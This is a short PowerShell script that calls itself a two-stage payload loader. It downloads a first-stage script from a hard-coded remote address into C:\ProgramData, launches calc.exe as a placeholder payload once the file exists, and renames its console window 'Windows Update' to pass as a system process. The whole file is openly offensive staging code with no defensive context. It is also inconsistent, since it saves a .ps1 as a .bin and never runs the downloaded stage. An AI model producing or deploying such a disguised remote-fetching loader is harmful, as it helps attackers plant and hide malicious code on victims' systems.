
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://192.0.2.157:8080/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\stage1.bin",
    [int]$ConnectionTimeout = 60
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$TransferResult = Invoke-Stage1Download -SourceUrl $TransferUrl -DestinationPath $DownloadPath -TimeoutSec $ConnectionTimeout
if ($TransferResult) {
    Start-Process -FilePath "calc.exe"
}
$Host.UI.RawUI.WindowTitle = "Windows Update"
